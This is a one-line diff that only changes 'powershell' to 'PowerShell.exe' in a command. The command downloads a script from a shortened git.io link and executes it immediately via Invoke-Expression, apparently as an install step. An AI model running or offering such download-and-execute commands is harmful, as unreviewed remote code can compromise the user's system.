@@ -1,1 +1,1 @@
-powershell iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JeLHG'))
+PowerShell.exe iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JeLHG'))
